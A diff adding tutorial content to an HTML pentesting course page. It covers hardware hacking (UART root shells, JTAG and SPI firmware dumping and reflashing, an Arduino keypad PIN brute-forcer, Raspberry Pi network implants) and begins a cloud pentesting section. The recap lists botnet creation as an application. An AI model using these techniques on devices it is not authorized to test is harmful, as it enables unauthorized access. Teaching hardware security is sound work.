@@ -2986,13 +2986,1535 @@ dz> run exploit
         <!-- SECTION 3: IoT & Hardware Hacking -->
         <section id="iot-hardware" class="section">
             <h2 class="section-title">IoT & Hardware Hacking</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">Welcome to the physical layer of hacking—where software meets hardware, where invisible radio waves carry secrets, and where a $5 chip can break a $5,000 smart lock. IoT (Internet of Things) devices are EVERYWHERE: smart thermostats, security cameras, baby monitors, door locks, medical devices, industrial controllers. They're connected to the internet, often poorly secured, and contain vulnerabilities that traditional pentesting misses. In this section, you'll learn to speak the language of hardware: UART, JTAG, SPI, I2C. You'll extract firmware from chips, reverse engineer protocols, and exploit devices that don't even have keyboards. This is where hackers become hardware ninjas!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 IoT Hacking = Being a Doctor for Electronics</h4>
+                <p>Imagine a smart lock is a patient. As a doctor, you need to:<br><br>
+                <strong>• Examine externally:</strong> Look at the device, find ports, identify chips<br>
+                <strong>• Take X-rays:</strong> Open the device, analyze the circuit board<br>
+                <strong>• Read its DNA:</strong> Extract firmware from memory chips<br>
+                <strong>• Listen to its heartbeat:</strong> Monitor serial communication (UART/SPI/I2C)<br>
+                <strong>• Perform surgery:</strong> Solder wires, connect debugging interfaces<br>
+                <strong>• Test reflexes:</strong> Send commands, observe responses<br><br>
+                Hardware hacking requires patience, careful observation, and understanding how electronics communicate. But the rewards are huge—you can bypass security that software-only hackers can't touch!</p>
+            </div>
+
+            <h3>Understanding Hardware Communication Protocols</h3>
+
+            <p>Before you can hack IoT devices, you need to understand how their internal components communicate. Here are the four most common hardware protocols:</p>
+
+            <h4>UART - Universal Asynchronous Receiver/Transmitter</h4>
+
+            <div class="info-box">
+                <h4>What is UART?</h4>
+                <p><strong>UART</strong> is the most common serial communication protocol. It's how embedded devices talk to computers and each other.<br><br>
+                <strong>Key characteristics:</strong><br>
+                • <strong>Asynchronous:</strong> No shared clock signal (devices agree on speed beforehand)<br>
+                • <strong>Two wires:</strong> TX (transmit) and RX (receive) + GND (ground)<br>
+                • <strong>Common speeds:</strong> 9600, 19200, 38400, 57600, 115200 baud (bits per second)<br>
+                • <strong>Use case:</strong> Debug consoles, bootloader access, shell access<br><br>
+                <strong>Why hackers love UART:</strong><br>
+                Many IoT devices have UART ports that give you a root shell! Manufacturers use them for debugging during development, then forget to disable them in production. Finding UART = instant access!</p>
+            </div>
+
+            <div class="code"># UART has 3 main pins (sometimes 4):
+# 
+# TX  (Transmit)  → Device sends data OUT
+# RX  (Receive)   → Device receives data IN
+# GND (Ground)    → Common ground reference
+# VCC (Power)     → Sometimes present (usually 3.3V or 5V)
+#
+# IMPORTANT: Connect TX of device to RX of your adapter!
+#           Connect RX of device to TX of your adapter!
+#           ALWAYS connect GND to GND!
+#
+# Visual diagram:
+# 
+# Your USB-to-UART adapter:       Target Device:
+# ┌────────────────┐              ┌──────────────┐
+# │ TX ────────────┼──────────────┼───→ RX       │
+# │ RX ←───────────┼──────────────┼──── TX       │
+# │ GND ───────────┼──────────────┼──── GND      │
+# └────────────────┘              └──────────────┘
+
+# Common UART devices you'll use:
+# • FTDI FT232 (USB to UART, ~$15)
+# • CP2102 module (~$5)
+# • PL2303 (~$3)
+# • Bus Pirate (multi-protocol, ~$35)</div>
+
+            <h4>Finding UART on a Circuit Board</h4>
+
+            <div class="code"># Step 1: Open the device (unscrew, pry carefully)
+
+# Step 2: Look for suspicious pin headers
+# UART pins often appear as:
+# • 4 holes in a row (labeled or unlabeled)
+# • 4 solder pads
+# • Test points labeled J1, J2, JP1, etc.
+# • Sometimes labeled: TX, RX, GND, VCC or UART, Serial, Console
+
+# Step 3: Use a multimeter to identify pins
+
+# Finding GND (Ground):
+# Set multimeter to continuity mode (beep symbol)
+# Touch black probe to a known ground (USB shield, screw holes, large metal areas)
+# Touch red probe to each pin
+# The pin that beeps = GND
+
+# Finding VCC (Power):
+# Set multimeter to voltage mode (DC V)
+# Black probe on GND
+# Red probe on each remaining pin
+# Pin showing 3.3V or 5.0V = VCC
+# (Device must be powered on!)
+
+# Finding TX (Transmit):
+# Set multimeter to voltage mode
+# Black probe on GND
+# Red probe on remaining pins
+# Pin that shows fluctuating voltage when device boots = TX
+# (TX is constantly sending data during boot)
+
+# Finding RX (Receive):
+# Process of elimination: the last pin is RX
+# Or: RX usually stays at VCC level (3.3V or 5V) when idle
+
+# Pro tip: If you have an oscilloscope or logic analyzer, 
+# connect to suspected TX pin and power on device.
+# You'll see data bursts during boot = confirmed TX!</div>
+
+            <h4>Connecting to UART</h4>
+
+            <div class="code"># Using a USB-to-UART adapter (e.g., FTDI FT232):
+
+# 1. Physical connections:
+# Device GND  → Adapter GND
+# Device TX   → Adapter RX
+# Device RX   → Adapter TX
+# (Do NOT connect VCC if device has its own power!)
+
+# 2. Plug adapter into your Kali machine
+
+# 3. Find the serial device:
+ls /dev/ttyUSB*
+
+# Output:
+# /dev/ttyUSB0
+
+# Or:
+dmesg | grep tty
+
+# Output:
+# [12345.678] usb 1-1: FTDI USB Serial Device converter now attached to ttyUSB0
+
+# 4. Determine baud rate (speed)
+# Common baud rates: 9600, 19200, 38400, 57600, 115200
+# Try each until you see readable text!
+
+# 5. Connect with screen:
+screen /dev/ttyUSB0 115200
+
+# Format: screen <device> <baud_rate>
+# 
+# If you see garbage text, wrong baud rate! Try another.
+# If you see nothing, try pressing Enter or rebooting the device.
+# If you see clean boot messages = SUCCESS!
+
+# Alternative tools:
+
+# minicom:
+minicom -D /dev/ttyUSB0 -b 115200
+
+# picocom:
+picocom -b 115200 /dev/ttyUSB0
+
+# cu:
+cu -l /dev/ttyUSB0 -s 115200
+
+# 6. Common UART outputs you'll see:
+
+# Example 1: Bootloader (U-Boot):
+# U-Boot 2020.04 (Jan 15 2024 - 12:34:56 +0000)
+# CPU: ARM Cortex-A7
+# DRAM: 512 MiB
+# Hit any key to stop autoboot: 3... 2... 1...
+# 
+# ← PRESS ENTER HERE TO INTERRUPT BOOT!
+# 
+# => 
+# ← You now have bootloader shell!
+
+# Example 2: Linux boot log:
+# [    0.000000] Booting Linux on physical CPU 0x0
+# [    0.000000] Linux version 4.19.0 (root@buildserver)
+# [    1.234567] Freeing unused kernel memory: 1024K
+# [    2.345678] systemd[1]: Starting system...
+# 
+# SmartDevice login: _
+# ← You get a login prompt!
+
+# Example 3: Root shell (jackpot!):
+# 
+# BusyBox v1.31.1 () built-in shell (ash)
+# Enter 'help' for a list of built-in commands.
+# 
+# / # _
+# ← Root shell without password!</div>
+
+            <div class="warning-box">
+                <h4>⚠️ UART Voltage Levels - Don't Fry Your Device!</h4>
+                <p><strong>CRITICAL:</strong> IoT devices typically use 3.3V logic. Some USB-to-UART adapters use 5V. Connecting 5V to a 3.3V device = DEAD DEVICE!<br><br>
+                <strong>Always check:</strong><br>
+                1. Measure VCC pin with multimeter<br>
+                2. Configure your adapter for correct voltage (most FTDI adapters have a jumper)<br>
+                3. Use a logic level shifter if mixing voltages<br><br>
+                <strong>Safe rule:</strong> If VCC reads ~3.3V, your adapter MUST be in 3.3V mode!<br>
+                <strong>Modern adapters:</strong> Many auto-detect voltage levels, but ALWAYS verify!</p>
+            </div>
+
+            <h4>JTAG - Joint Test Action Group</h4>
+
+            <div class="info-box">
+                <h4>What is JTAG?</h4>
+                <p><strong>JTAG</strong> is a debugging interface that gives you COMPLETE control over a processor. Originally designed for testing circuit boards, it's now used for programming chips and debugging firmware.<br><br>
+                <strong>Key capabilities:</strong><br>
+                • <strong>Read/write memory:</strong> Dump firmware directly from chip<br>
+                • <strong>Step through code:</strong> Debug firmware line by line<br>
+                • <strong>Set breakpoints:</strong> Pause execution at specific addresses<br>
+                • <strong>Flash firmware:</strong> Write modified firmware to device<br><br>
+                <strong>Why hackers love JTAG:</strong><br>
+                JTAG bypasses all software security. Password protection? Irrelevant. Encryption? Can dump keys from memory. Locked bootloader? Can read firmware anyway.<br><br>
+                <strong>Downside:</strong> Requires physical access, soldering skills, and expensive tools (but worth it!)</p>
+            </div>
+
+            <div class="code"># JTAG has 4-5 main pins:
+# 
+# TDI  (Test Data In)       → Data going TO the chip
+# TDO  (Test Data Out)      → Data coming FROM the chip
+# TCK  (Test Clock)         → Clock signal
+# TMS  (Test Mode Select)   → Control signal
+# TRST (Test Reset)         → Reset signal (optional)
+# GND  (Ground)             → Common ground
+# VCC  (Target Voltage)     → Reference voltage (don't connect power!)
+
+# Common JTAG adapters:
+# • Bus Pirate (~$35, beginner-friendly)
+# • SEGGER J-Link (~$60 for EDU version)
+# • FTDI-based JTAG adapters (~$20)
+# • Black Magic Probe (~$70, pro-level)
+
+# Finding JTAG pins:
+# Look for:
+# • 10-pin, 14-pin, or 20-pin headers (standard JTAG connectors)
+# • Labeled pads: JTAG, TCK, TMS, TDI, TDO
+# • ARM processors often have 10-pin or 20-pin JTAG
+
+# Identifying JTAG pins with multimeter:
+# 1. Find GND (continuity test to metal chassis)
+# 2. Find VCC (measures 3.3V or 1.8V when powered)
+# 3. Remaining pins require logic analyzer or trial-and-error
+
+# Or use JTAGulator (~$150):
+# Automated tool that finds JTAG pins by testing all combinations!</div>
+
+            <h4>Using OpenOCD with JTAG</h4>
+
+            <div class="code"># OpenOCD (Open On-Chip Debugger) is THE tool for JTAG
+
+# Install on Kali:
+sudo apt install openocd
+
+# Example: Connect to ARM Cortex-M3 chip using FTDI adapter
+
+# Step 1: Create config file (openocd.cfg):
+interface ftdi
+ftdi_vid_pid 0x0403 0x6014
+ftdi_layout_init 0x0008 0x000b
+
+transport select jtag
+
+source [find target/stm32f1x.cfg]
+
+# Step 2: Run OpenOCD:
+openocd -f openocd.cfg
+
+# Output:
+# Open On-Chip Debugger 0.11.0
+# Info : FTDI FT232H found
+# Info : clock speed 1000 kHz
+# Info : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477
+# Info : stm32f1x.cpu: hardware has 6 breakpoints, 4 watchpoints
+# Info : starting gdb server for stm32f1x.cpu on 3333
+# Info : Listening on port 3333 for gdb connections
+
+# Step 3: Connect with GDB (in another terminal):
+arm-none-eabi-gdb
+
+# Inside GDB:
+(gdb) target remote localhost:3333
+(gdb) monitor reset halt
+(gdb) monitor flash write_image erase firmware.bin 0x08000000
+(gdb) monitor reset
+
+# You just flashed custom firmware via JTAG!
+
+# Step 4: Dump firmware from chip:
+# In OpenOCD telnet session:
+telnet localhost 4444
+
+# Inside OpenOCD telnet:
+> halt
+> dump_image firmware_dump.bin 0x08000000 0x20000
+
+# Dumps 128KB of firmware from address 0x08000000!
+
+# Common OpenOCD commands:
+# halt                        → Stop CPU
+# reset                       → Reset CPU
+# reset halt                  → Reset and stop
+# mdw <address>               → Read 32-bit word from memory
+# mww <address> <value>       → Write 32-bit word to memory
+# dump_image <file> <addr> <size> → Dump memory region
+# load_image <file> <addr>    → Load file into memory
+# reg                         → Show all registers
+# step                        → Execute one instruction</div>
+
+            <h4>SPI - Serial Peripheral Interface</h4>
+
+            <div class="info-box">
+                <h4>What is SPI?</h4>
+                <p><strong>SPI</strong> is a synchronous serial protocol used for communicating with flash memory chips, sensors, and displays.<br><br>
+                <strong>Key characteristics:</strong><br>
+                • <strong>4 wires:</strong> MOSI, MISO, SCK, CS<br>
+                • <strong>Synchronous:</strong> Has dedicated clock line<br>
+                • <strong>Fast:</strong> Much faster than UART or I2C<br>
+                • <strong>Common use:</strong> Flash memory chips (EEPROM, NOR flash)<br><br>
+                <strong>Why hackers love SPI:</strong><br>
+                Many IoT devices store firmware on external SPI flash chips. You can desolder the chip, read it with a $10 programmer, extract firmware, modify it, and flash it back. Complete firmware control without JTAG!</p>
+            </div>
+
+            <div class="code"># SPI has 4 main pins:
+# 
+# MOSI (Master Out, Slave In)  → Data from your tool to chip
+# MISO (Master In, Slave Out)  → Data from chip to your tool
+# SCK  (Serial Clock)          → Clock signal
+# CS   (Chip Select)           → Enable this specific chip (active low)
+# GND  (Ground)                → Common ground
+
+# Common SPI flash chips:
+# • 25LC series (Microchip)
+# • AT25 series (Atmel)
+# • MX25L series (Macronix)
+# • W25Q series (Winbond) ← Very common!
+
+# Identifying SPI flash chips:
+# Look for 8-pin SOIC or WSON packages
+# Chip markings: W25Q128FV, MX25L3206E, etc.
+# First digits indicate family, last digits indicate size:
+#   W25Q64  = 64 Mbit (8 MB)
+#   W25Q128 = 128 Mbit (16 MB)
+
+# Reading SPI flash with CH341A programmer (~$5 on AliExpress):
+
+# Step 1: Identify chip pinout (look up datasheet)
+# Standard SOIC8 pinout:
+#     ┌─────┐
+# CS  │1  8│ VCC
+# DO  │2  7│ HOLD
+# WP  │3  6│ CLK
+# GND │4  5│ DI
+#     └─────┘
+
+# Step 2: Place chip in programmer socket (or use test clip)
+
+# Step 3: Connect programmer to USB
+
+# Step 4: Use flashrom to read:
+flashrom -p ch341a_spi -r firmware_dump.bin
+
+# Output:
+# flashrom v1.2
+# Calibrating delay loop... OK.
+# Found Winbond flash chip "W25Q128.V" (16384 kB, SPI) on ch341a_spi.
+# Reading flash... done.
+
+# Step 5: Analyze firmware:
+binwalk firmware_dump.bin
+strings firmware_dump.bin | grep -i password
+
+# Step 6: Modify firmware (e.g., remove password check)
+# [Use hex editor or recompile]
+
+# Step 7: Write modified firmware back:
+flashrom -p ch341a_spi -w modified_firmware.bin
+
+# Step 8: Resolder chip to board (or reconnect)
+
+# Device now runs your modified firmware!</div>
+
+            <h4>I2C - Inter-Integrated Circuit</h4>
+
+            <div class="info-box">
+                <h4>What is I2C?</h4>
+                <p><strong>I2C</strong> (pronounced "I-squared-C") is a two-wire communication protocol for connecting sensors, EEPROMs, and peripherals.<br><br>
+                <strong>Key characteristics:</strong><br>
+                • <strong>2 wires:</strong> SDA (data) and SCL (clock)<br>
+                • <strong>Multi-master:</strong> Multiple devices on same bus<br>
+                • <strong>Addressing:</strong> Each device has unique 7-bit address<br>
+                • <strong>Slower:</strong> Typically 100-400 kHz<br><br>
+                <strong>Why hackers love I2C:</strong><br>
+                I2C is used for configuration EEPROMs that store device settings, MAC addresses, encryption keys. You can read/write these without removing chips!</p>
+            </div>
+
+            <div class="code"># I2C has 2 main pins (+ power):
+# 
+# SDA (Serial Data)    → Bidirectional data line
+# SCL (Serial Clock)   → Clock signal
+# GND (Ground)         → Common ground
+# VCC (Power)          → Pull-up voltage (3.3V or 5V)
+
+# Common I2C devices:
+# • AT24C series EEPROMs (configuration storage)
+# • DS1307 RTC (real-time clock)
+# • BME280 (temperature/humidity sensor)
+# • OLED displays
+
+# Using Bus Pirate to scan I2C bus:
+
+# Connect Bus Pirate:
+screen /dev/ttyUSB0 115200
+
+# Enter I2C mode:
+HiZ> m
+# Select: 4 (I2C)
+I2C> W
+# Power: ON
+I2C> P
+# Pull-ups: ON
+
+# Scan for I2C devices:
+I2C> (1)
+# Macro 1 = I2C bus scanner
+
+# Output:
+# Searching I2C address space. Found devices at:
+# 0x50 (0xA0 W) (0xA1 R)  ← EEPROM detected!
+# 0x68 (0xD0 W) (0xD1 R)  ← RTC detected!
+
+# Read from EEPROM at address 0x50:
+I2C> [0xA0 0x00 0x00 [0xA1 r:16]
+
+# Format breakdown:
+# [ = Start condition
+# 0xA0 = Device address (write mode)
+# 0x00 0x00 = Memory address to read from
+# [ = Repeated start
+# 0xA1 = Device address (read mode)
+# r:16 = Read 16 bytes
+# ] = Stop condition
+
+# Output (hex dump of EEPROM):
+# 0x48 0x65 0x6C 0x6C 0x6F 0x20 0x57 0x6F ...
+# (ASCII: "Hello World...")
+
+# Write to EEPROM:
+I2C> [0xA0 0x00 0x00 0x41 0x42 0x43]
+# Writes "ABC" to address 0x0000</div>
+
+            <h3>Bus Pirate - The Universal Hardware Hacking Tool</h3>
+
+            <p><strong>Bus Pirate</strong> is a multi-protocol hardware debugging tool that speaks UART, SPI, I2C, JTAG, 1-Wire, and more. It's like a Swiss Army knife for hardware hacking!</p>
+
+            <div class="code"># Bus Pirate v3.6 (~$35, v4 ~$50)
+# Buy from: Seeed Studio, Adafruit, SparkFun
+
+# Connect to Bus Pirate:
+screen /dev/ttyUSB0 115200
+
+# Output:
+# HiZ>
+
+# Get help:
+HiZ> ?
+
+# Main modes:
+# 1. UART
+# 2. I2C
+# 3. SPI
+# 4. JTAG
+# 5. 1-Wire
+# 6. Raw wire (bitbang mode)
+
+# Example: Dump SPI flash with Bus Pirate
+
+# Enter SPI mode:
+HiZ> m
+# Select: 5 (SPI)
+SPI> 3
+# Select speed: 3 (1 MHz)
+SPI> W
+# Power: ON
+
+# Read JEDEC ID from flash chip:
+SPI> [0x9F r:3]
+
+# Output:
+# 0xEF 0x40 0x18
+# ← Winbond W25Q128 detected!
+
+# Dump first page (256 bytes):
+SPI> [0x03 0x00 0x00 0x00 r:256]
+# Command 0x03 = Read data
+# Address: 0x000000
+# Read: 256 bytes
+
+# Bus Pirate pin assignments:
+# Pin 1: GND
+# Pin 2: +3.3V (output)
+# Pin 3: +5V (output)
+# Pin 4: ADC (voltage measurement)
+# Pin 5-10: Protocol-specific (changes per mode)
+
+# UART mode (pins 5-10):
+# Pin 7: TX  (transmit)
+# Pin 8: RX  (receive)
+
+# SPI mode (pins 5-10):
+# Pin 5: CS  (chip select)
+# Pin 6: MISO (data in)
+# Pin 7: CLK (clock)
+# Pin 8: MOSI (data out)
+
+# I2C mode (pins 5-10):
+# Pin 7: SDA (data)
+# Pin 8: SCL (clock)
+
+# Measure voltage on a pin:
+HiZ> v
+# Shows voltage on ADC pin (Pin 4)</div>
+
+            <h3>Arduino & Raspberry Pi as Hacking Tools</h3>
+
+            <h4>Arduino for Hardware Attacks</h4>
+
+            <div class="code"># Arduino can be used for:
+# • Brute-forcing PIN codes
+# • Replay attacks (capturing and replaying RF signals)
+# • BadUSB attacks (act as malicious keyboard/mouse)
+# • Protocol fuzzing
+# • Custom hardware implants
+
+# Example: Arduino-based PIN brute-forcer for keypads
+
+# Hardware needed:
+# • Arduino Uno ($25)
+# • Relay module ($5)
+# • Jumper wires
+
+# Arduino sketch (PIN_Bruteforce.ino):
+
+void setup() {
+  // Set pins 2-5 as outputs (connected to keypad buttons)
+  pinMode(2, OUTPUT);  // Button 1
+  pinMode(3, OUTPUT);  // Button 2
+  pinMode(4, OUTPUT);  // Button 3
+  pinMode(5, OUTPUT);  // Button 4
+  
+  Serial.begin(9600);
+}
+
+void pressButton(int button, int duration) {
+  digitalWrite(button, HIGH);  // Press button
+  delay(duration);
+  digitalWrite(button, LOW);   // Release button
+  delay(200);
+}
+
+void enterPIN(int pin) {
+  String pinStr = String(pin);
+  
+  for (int i = 0; i < pinStr.length(); i++) {
+    int digit = pinStr.charAt(i) - '0';
+    pressButton(digit + 2, 100);  // Press corresponding button
+    delay(200);
+  }
+  
+  pressButton(6, 100);  // Press ENTER button
+  delay(2000);  // Wait for response
+}
+
+void loop() {
+  Serial.println("Starting PIN brute-force: 0000-9999");
+  
+  for (int pin = 0; pin <= 9999; pin++) {
+    Serial.print("Trying: ");
+    Serial.println(pin);
+    
+    enterPIN(pin);
+    
+    // Check if access granted (monitor LED or use light sensor)
+    // If successful, stop and alert
+    
+    delay(500);  // Prevent rate limiting
+  }
+}
+
+# This will try all 10,000 PINs automatically!
+# At 3 seconds per attempt = ~8 hours for full range</code></div>
+
+            <h4>Raspberry Pi for Advanced Attacks</h4>
+
+            <div class="code"># Raspberry Pi can run full Kali Linux!
+# Perfect for:
+# • Portable pentesting platform
+# • Wireless attacks (with USB WiFi adapter)
+# • Network implants (drop box)
+# • Automated exploitation
+# • Man-in-the-middle attacks
+
+# Install Kali on Raspberry Pi:
+# Download: https://www.kali.org/get-kali/#kali-arm
+# Flash to SD card:
+dd if=kali-linux-2024.1-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress
+
+# Default credentials:
+# Username: kali
+# Password: kali
+
+# Use cases:
+
+# 1. WiFi Pineapple alternative:
+# Set up rogue access point with hostapd
+# Capture credentials with Responder
+
+# 2. Network implant:
+# Hide Raspberry Pi in target network
+# VPN back to your C2 server
+# Pivot into internal network
+
+# 3. Physical pentesting tool:
+# Battery pack + Pi + USB ethernet adapter
+# Plug into network jack
+# Automatic nmap scan and exploitation
+
+# 4. RFID/NFC cloning:
+# Connect PN532 NFC module
+# Clone access badges
+
+# 5. SDR (Software Defined Radio):
+# Connect RTL-SDR dongle
+# Capture 433 MHz signals (garage doors, car keys)
+# Analyze and replay</div>
+
+            <h3>Firmware Extraction & Analysis</h3>
+
+            <h4>Method 1: Dumping Firmware via UART/JTAG</h4>
+
+            <div class="code"># If you have bootloader access via UART:
+
+# U-Boot example:
+=> md 0x80000000 0x100000
+# Reads 1MB from address 0x80000000
+# Copy output (hex dump) to file
+
+# Or use loadb/loady to transfer via YMODEM:
+=> loady 0x80000000
+# In your terminal: Ctrl+A, then :exec !! sz firmware.bin
+
+# If you have JTAG access:
+# Use OpenOCD (shown earlier):
+telnet localhost 4444
+> dump_image firmware.bin 0x00000000 0x200000
+# Dumps 2MB from start of flash</div>
+
+            <h4>Method 2: Reading Flash Chip Directly</h4>
+
+            <div class="code"># Desolder flash chip or use test clip
+
+# Using flashrom with CH341A programmer:
+flashrom -p ch341a_spi -r firmware.bin
+
+# Using Bus Pirate:
+# (More complex, requires Python script)
+python flashrom.py --read firmware.bin
+
+# Using logic analyzer + sigrok:
+# Capture SPI traffic during boot
+# Reconstruct firmware from captured data</div>
+
+            <h4>Method 3: Extracting from Update Files</h4>
+
+            <div class="code"># Many manufacturers provide firmware updates
+# Download from their website
+# Extract with binwalk:
+
+binwalk -e firmware_update.bin
+
+# Output:
+# DECIMAL       HEXADECIMAL     DESCRIPTION
+# --------------------------------------------------------------------------------
+# 0             0x0             uImage header
+# 64            0x40            LZMA compressed data
+# 1048576       0x100000        Squashfs filesystem, little endian
+# 3145728       0x300000        JFFS2 filesystem data
+
+cd _firmware_update.bin.extracted/
+ls
+
+# You now have the filesystem!
+# Look for:
+# - /etc/passwd (user accounts)
+# - /etc/shadow (password hashes)
+# - /etc/config/ (device configuration)
+# - Hardcoded credentials
+# - Private keys
+# - API tokens</div>
+
+            <h4>Analyzing Firmware with Binwalk</h4>
+
+            <div class="code"># Binwalk is THE tool for firmware analysis
+
+# Basic scan:
+binwalk firmware.bin
+
+# Extract all embedded files:
+binwalk -e firmware.bin
+
+# Extract AND run entropy analysis:
+binwalk -E firmware.bin
+
+# High entropy = encrypted/compressed data
+# Low entropy = plaintext/code
+
+# Signature scan:
+binwalk -B firmware.bin
+
+# Looks for known file signatures
+
+# Disassemble code:
+binwalk -D 'arm:bootloader' firmware.bin
+
+# Custom extraction:
+binwalk --dd='.*' firmware.bin
+
+# After extraction, explore the filesystem:
+cd _firmware.bin.extracted/squashfs-root/
+find . -name "*.conf" -o -name "*.cfg" | xargs grep -i "password"
+
+# Common findings:
+# - WiFi passwords in /etc/wireless/config
+# - Admin passwords in /etc/shadow
+# - API keys in /etc/api.conf
+# - Backdoor accounts in /etc/passwd</div>
+
+            <h3>Hardware Reverse Engineering</h3>
+
+            <h4>Identifying Chips</h4>
+
+            <div class="code"># Every chip has markings. Learn to read them:
+
+# Example marking: "STM32F103C8T6"
+# STM = Manufacturer (STMicroelectronics)
+# 32 = Product line (32-bit)
+# F = Family (Foundation)
+# 103 = Model number
+# C8 = Flash size (64KB)
+# T6 = Package type and temperature range
+
+# Google the full part number to find:
+# - Datasheet (pinout, specifications)
+# - Application notes (how to use it)
+# - Community resources (hacks, exploits)
+
+# Common manufacturer codes:
+# STM = STMicroelectronics (MCUs)
+# ESP = Espressif (WiFi chips)
+# ATmega = Atmel/Microchip (Arduino MCUs)
+# BCM = Broadcom (networking chips)
+# MT = MediaTek (WiFi/Bluetooth)
+# W25Q = Winbond (flash memory)
+
+# If markings are scratched off or illegible:
+# 1. Measure package dimensions
+# 2. Count pins
+# 3. Trace PCB connections
+# 4. Use multimeter to identify power/ground
+# 5. Google similar devices for clues</div>
+
+            <h4>PCB Reverse Engineering</h4>
+
+            <div class="code"># Steps to reverse engineer a circuit board:
+
+# 1. High-resolution photos (both sides)
+# Use good lighting, steady camera
+# Take multiple angles
+
+# 2. Identify components
+# Look up all chip part numbers
+# Create component list
+
+# 3. Trace connections with multimeter
+# Continuity mode: beep = connected
+# Map which pins connect to what
+
+# 4. Draw schematic (optional but helpful)
+# Use KiCad, Eagle, or pen+paper
+# Document power, ground, signal connections
+
+# 5. Find interesting test points
+# Look for unpopulated headers
+# Probe with oscilloscope/logic analyzer
+# Identify communication protocols
+
+# Tools for PCB analysis:
+# • Multimeter ($20-100)
+# • Logic analyzer ($10-200)
+#   - Cheap: Saleae clones ($10)
+#   - Pro: Saleae Logic Pro ($500)
+# • Oscilloscope ($100-1000+)
+#   - Entry: Rigol DS1054Z ($400)
+#   - Budget: Hantek DSO2D15 ($200)
+# • Microscope (USB microscope, $30-100)
+# • Hot air station (for desoldering, $50-150)
+
+# Logic analyzer usage example:
+# Connect probes to suspected UART TX pin
+# Set trigger: Rising edge
+# Capture during device boot
+# Analyze with PulseView/Sigrok:
+pulseview
+
+# Protocol decoder: UART
+# Baud rate: Auto-detect or try common rates
+# View decoded text: You see boot messages!</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're Now a Hardware Hacker!</h4>
+                <p>You've learned:<br><br>
+                ✅ <strong>UART:</strong> Serial console access, finding pins, connecting adapters<br>
+                ✅ <strong>JTAG:</strong> Complete processor control, firmware dumping with OpenOCD<br>
+                ✅ <strong>SPI:</strong> Flash memory extraction, chip programming<br>
+                ✅ <strong>I2C:</strong> EEPROM reading/writing, configuration manipulation<br>
+                ✅ <strong>Bus Pirate:</strong> Multi-protocol swiss army knife<br>
+                ✅ <strong>Arduino/Pi:</strong> Custom hardware attacks, portable platforms<br>
+                ✅ <strong>Firmware extraction:</strong> Binwalk, flashrom, bootloader dumps<br>
+                ✅ <strong>Hardware RE:</strong> Chip identification, PCB tracing, protocol analysis<br><br>
+                <strong>Real-world applications:</strong><br>
+                • Smart lock bypass (UART root shell)<br>
+                • Security camera firmware extraction (hardcoded admin password)<br>
+                • Industrial controller exploitation (exposed JTAG)<br>
+                • IoT botnet creation (compromised firmware)<br>
+                • Physical implants (Raspberry Pi drop box)<br><br>
+                <strong>Next steps:</strong><br>
+                • Buy a cheap IoT device (security camera, smart plug)<br>
+                • Open it up, find UART pins<br>
+                • Connect, get root shell<br>
+                • Extract firmware with binwalk<br>
+                • Find hardcoded credentials<br>
+                • Modify firmware, reflash<br><br>
+                Hardware hacking is incredibly rewarding. You're not just typing commands—you're physically interacting with circuits, chips, and signals. It's hacking you can TOUCH! 🔧⚡</p>
+            </div>
         </section>
 
         <!-- SECTION 4: Cloud Penetration Testing -->
         <section id="cloud-pentesting" class="section">
             <h2 class="section-title">Cloud Penetration Testing</h2>
-            <p class="section-intro"><!-- EXPAND THIS SECTION --></p>
+            <p class="section-intro">The cloud isn't someone else's computer—it's someone else's MASSIVE infrastructure that you need to secure! AWS, Azure, Google Cloud... these platforms run millions of companies' critical data. One misconfigured S3 bucket = data breach. One overprivileged IAM role = complete account takeover. Traditional network pentesting skills don't directly translate to cloud—you need to understand IAM policies, storage permissions, serverless functions, container orchestration, and cloud-specific attack vectors. In this section, you'll learn to assess cloud security like a pro, find misconfigurations that lead to breaches, and exploit the unique vulnerabilities of cloud environments!</p>
+
+            <div class="metaphor-box">
+                <h4>💡 Cloud Pentesting = Auditing a Massive Apartment Complex</h4>
+                <p>Imagine AWS as a HUGE apartment building with millions of units (resources). Each tenant (customer) has:<br><br>
+                <strong>• Keys (IAM credentials):</strong> Some tenants give master keys to janitors (overprivileged roles)<br>
+                <strong>• Storage units (S3 buckets):</strong> Some leave them unlocked (public read access)<br>
+                <strong>• Doors (security groups):</strong> Some leave front doors wide open (0.0.0.0/0)<br>
+                <strong>• Shared spaces (public snapshots):</strong> Accidentally shared with everyone<br><br>
+                Your job as a cloud pentester:<br>
+                • Find unlocked doors (exposed services)<br>
+                • Test if janitor keys work on penthouse units (privilege escalation)<br>
+                • Check storage units for sensitive data (S3 enumeration)<br>
+                • Look for shared items that shouldn't be (snapshot/AMI exposure)<br><br>
+                Cloud security is about CONFIGURATION, not exploiting software vulnerabilities!</p>
+            </div>
+
+            <h3>Understanding Cloud Security Models</h3>
+
+            <h4>The Shared Responsibility Model</h4>
+
+            <div class="info-box">
+                <h4>Who Secures What?</h4>
+                <p><strong>Cloud Provider's Responsibility (AWS/Azure/GCP):</strong><br>
+                • Physical security of data centers<br>
+                • Hardware maintenance<br>
+                • Network infrastructure<br>
+                • Hypervisor security<br>
+                • Managed service security<br><br>
+                <strong>Customer's Responsibility (YOU!):</strong><br>
+                • IAM policies and user management<br>
+                • Data encryption<br>
+                • Network configuration (security groups, NACLs)<br>
+                • Operating system patches<br>
+                • Application security<br>
+                • S3 bucket permissions<br>
+                • Database access controls<br><br>
+                <strong>The problem:</strong> Most breaches happen because customers misconfigure THEIR part—not because of cloud provider failures. That's what you're testing for!</p>
+            </div>
+
+            <h3>AWS Security Assessment with ScoutSuite</h3>
+
+            <p><strong>ScoutSuite</strong> is a multi-cloud security auditing tool (formerly Scout2). It scans your AWS/Azure/GCP environment and generates a comprehensive HTML report of security issues.</p>
+
+            <div class="code"># Install ScoutSuite:
+pip3 install scoutsuite
+
+# Or from GitHub:
+git clone https://github.com/nccgroup/ScoutSuite
+cd ScoutSuite
+pip3 install -r requirements.txt
+
+# Verify installation:
+scout --help
+
+# Output:
+# usage: scout [-h] {aws,azure,gcp,aliyun,oci} ...
+# 
+# Scout Suite - Multi-Cloud Security Auditing Tool</div>
+
+            <h4>Running ScoutSuite Against AWS</h4>
+
+            <div class="code"># Prerequisites: AWS credentials configured
